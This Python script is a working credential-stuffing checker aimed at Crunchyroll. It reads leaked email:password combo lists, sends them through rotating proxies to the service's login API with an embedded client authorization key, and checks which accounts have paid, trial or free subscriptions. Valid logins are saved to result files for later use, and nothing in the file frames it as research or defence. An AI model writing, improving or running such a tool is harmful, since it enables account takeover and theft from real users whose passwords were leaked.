import json
import os
import threading
import queue
import time
from cloudscraper import create_scraper
from uuid import uuid4
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import random

# Initialize colorama
init(autoreset=True)

# Ensure the result folder exists
os.makedirs('result', exist_ok=True)

bad = 0
error = 0
hits = 0
free = 0
trial = 0
checked = 0
total_accounts = 0

# Regular expression for extracting email and password
EMAILPASS_REGEX = r'[\w\.]+@[\w\.]+:[\S]+'

# Load proxies from file
proxies = []
with open('proxies.txt', 'r') as file:
    proxies = [line.strip() for line in file if line.strip()]

# Queue lock
queue_lock = threading.Lock()

def get_random_proxy():
    return random.choice(proxies) if proxies else None

def update_title():
    os.system(f'title Total: {total_accounts} ^| Checked: {checked} ^| Hits: {hits} ^| Free: {free} ^| Trial: {trial} ^| Bad: {bad} ^| Error: {error} By A7med')

def update_title_periodically():
    while checked < total_accounts:
        update_title()
        time.sleep(3)

def crunchyroll_login(email, password):
    global bad, error, hits, free, trial, checked
    scraper = create_scraper()
    uuid = uuid4()

    login_url = "https://beta-api.crunchyroll.com/auth/v1/token"
    login_params = {
        "grant_type": "password",
        "scope": "offline_access",
        "username": email,
        "password": password
    }
    headers = {
        "User-Agent": "Crunchyroll/3.47.0 Android/10 okhttp/4.12.0",
        "authorization": "Basic ejFrYWxhenhhaXFvNDhnZDgzbXg6LVdkamJidmJyNTE5QUxEMEtvUDBTQTgyemdTaHpoNkk=",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    for attempt in range(3): 
        proxy = get_random_proxy()
        try:
            response = scraper.post(login_url, headers=headers, data=login_params, proxies={"http": proxy, "https": proxy})
            if response.status_code == 200:
                res = response.json()
                access_token = res.get("access_token")
                if access_token:
                    headers["authorization"] = f"Bearer {access_token}"
                    return check_account(email, password, headers, scraper, proxy)
                else:
                    print(Fore.RED + f"[error] {email}:{password} - Access token not found")
                    error += 1
                    save_result("error", email, password)
            else:
                print(Fore.RED + f"[bad] {email}:{password}")
                bad += 1
                save_result("bad", email, password)
            break
        except Exception as e:
            print(Fore.YELLOW + f"[retry] {proxy} - {str(e)}")
            time.sleep(1)
    else:
        print(Fore.RED + f"[error] {email}:{password} - Max retries reached")
        error += 1
        save_result("error", email, password)

    with queue_lock:
        checked += 1

def check_account(email, password, headers, scraper, proxy):
    global hits, free, trial, checked, bad, error
    account_url = "https://beta-api.crunchyroll.com/accounts/v1/me"

    for attempt in range(3):  # Retry logic
        proxy = get_random_proxy()
        try:
            response = scraper.get(account_url, headers=headers, proxies={"http": proxy, "https": proxy})
            if response.status_code == 200:
                res = response.json()
                external_id = res.get("external_id")
                if external_id:
                    subscription_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products"
                    response = scraper.get(subscription_url, headers=headers, proxies={"http": proxy, "https": proxy})
                    if response.status_code == 200:
                        res = response.json()
                        if res.get("total"):
                            free_trial = res['items'][0].get('active_free_trial', False)
                            if free_trial:
                                with queue_lock:
                                    trial += 1
                                print(Fore.BLUE + f"[trial] {email}:{password}")
                                save_result("trial", email, password)
                            else:
                                with queue_lock:
                                    hits += 1
                                print(Fore.GREEN + f"[hit] {email}:{password}")
                                save_result("hit", email, password)
                        else:
                            with queue_lock:
                                free += 1
                            print(Fore.CYAN + f"[free] {email}:{password}")
                            save_result("free", email, password)
                    else:
                        with queue_lock:
                            free += 1
                        print(Fore.CYAN + f"[free] {email}:{password}")
                        save_result("free", email, password)
                else:
                    with queue_lock:
                        free += 1
                    print(Fore.CYAN + f"[free] {email}:{password}")
                    save_result("free", email, password)
            else:
                with queue_lock:
                    bad += 1
                print(Fore.RED + f"[bad] {email}:{password}")
                save_result("bad", email, password)
            break
        except Exception as e:
            with queue_lock:
                error += 1
            print(Fore.RED + f"[error] {email}:{password} - {str(e)}")
            save_result("error", email, password)
            time.sleep(1)

    with queue_lock:
        checked += 1

def save_result(result_type, email, password):
    result = f"{email}:{password}\n"
    with open(f'result/{result_type}.txt', 'a') as f:
        f.write(result)

def worker(q):
    while not q.empty():
        email, password = q.get()
        crunchyroll_login(email, password)
        q.task_done()

def cpm_calculator(start_time, total_accounts):
    while checked < total_accounts:
        elapsed_time = time.time() - start_time
        current_cpm = checked / elapsed_time * 60
        time.sleep(5)  # Update CPM every 5 seconds

if __name__ == "__main__":
    credential_queue = queue.Queue()
    with open('combos.txt', 'r', encoding='utf-8') as file:
        for line in file:
            try:
                email, password = line.strip().split(':')
                credential_queue.put((email, password))
            except ValueError:
                continue  

    total_accounts = credential_queue.qsize()
    start_time = time.time()

    for _ in range(5):  # Number of threads
        threading.Thread(target=worker, args=(credential_queue,)).start()

    threading.Thread(target=update_title_periodically).start()
    threading.Thread(target=cpm_calculator, args=(start_time, total_accounts)).start()

    credential_queue.join()

    end_time = time.time()
    total_time = end_time - start_time
    final_cpm = checked / total_time * 60

    print("\n===== Summary =====")
    print(f"Total accounts: {total_accounts}")
    print(f"Hits: {hits}")
    print(f"Free: {free}")
    print(f"Trial: {trial}")
    print(f"Bad attempts: {bad}")
    print(f"Errors: {error}")
    print(f"Final CPM: {final_cpm:.2f}")
    input("Press Enter to close...")
